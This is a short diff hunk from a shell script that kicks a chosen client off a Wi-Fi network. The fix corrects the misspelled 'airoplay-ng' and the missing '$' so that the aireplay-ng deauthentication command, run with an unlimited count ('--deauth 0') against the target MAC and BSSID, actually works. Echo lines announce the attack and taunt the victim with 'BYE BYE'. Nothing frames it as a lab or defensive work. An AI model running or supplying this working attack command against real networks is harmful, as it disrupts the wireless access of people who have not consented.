@@ -29,4 +29,4 @@ echo "Attacking $CLI_MAC. Press Ctrl+C to stop the attack"
 sleep 3
 echo "BYE BYE $CLI_MAC :)"
 sleep 2
-sudo airoplay-ng --deauth 0 -c "CLI_MAC" -a "$network_bssid" wlan0mon
+sudo aireplay-ng --deauth 0 -c "$CLI_MAC" -a "$network_bssid" wlan0mon
